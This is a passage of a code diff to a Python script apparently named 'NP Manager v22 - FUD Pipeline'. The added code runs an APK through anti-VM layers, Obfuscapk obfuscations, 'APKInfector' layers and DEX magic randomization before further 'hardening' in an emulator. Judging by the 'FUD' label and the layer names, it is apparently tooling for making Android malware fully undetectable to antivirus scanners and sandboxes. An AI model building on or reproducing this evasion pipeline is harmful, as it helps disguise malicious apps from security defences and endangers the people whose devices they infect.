+            print("[PREP] WARNING: recompile failed — using original for Phase D")
+        _shutil.rmtree(dec_dir, ignore_errors=True)
+
+    # ── Phase D: DEX magic ────────────────────────────────────
+    print("[PREP] ── Phase D: DEX Magic Randomization ──")
+    dex_out = os.path.join(_PREP, "phase_d.apk")
+    try:
+        _dex_magic(current, dex_out)
+        if os.path.exists(dex_out) and os.path.getsize(dex_out) > 0:
+            current = dex_out
+            print(f"[PREP] Phase D done: {os.path.getsize(current) // 1024} KB")
+    except Exception as e:
+        print(f"[PREP] Phase D error: {e}")
+
+    INPUT_APK = current
+    print(f"[PREP] PREPROCESSING COMPLETE → {current}")
+    print(f"[PREP] Layers applied: Anti-VM + 11 Obfuscapk + 5 APKInfector + DEX-magic")
+    print(f"[PREP] NP Manager 7 tools will run next as Phase E.")
+    print("=" * 60 + "\n")
+    return current
+
 
 def run(cmd, timeout=30):
     try:
@@ -1380,10 +2198,18 @@ def save_output():
 
 def run_pipeline():
     print("="*60)
-    print("NP Manager v21 - Full Login + Tools Pipeline")
+    print("NP Manager v22 - FUD Pipeline (PC Preprocess + NP Manager 7 Tools)")
     print("="*60)
     os.makedirs(OUTPUT_DIR, exist_ok=True)
     os.makedirs(SCREENSHOT_DIR, exist_ok=True)
+
+    # ── PC-side preprocessing runs FIRST (before emulator) ──
+    # Adds: Anti-VM(7), Obfuscapk(11), APK Infector(5), DEX-magic
+    # NP Manager 7 tools run after as the final hardening layer.
+    if INPUT_APK:
+        preprocess_apk(INPUT_APK)
+    else:
+        print("[PREP] No INPUT_APK set — skipping preprocessing")
 
     if not wait_for_boot():
         return False
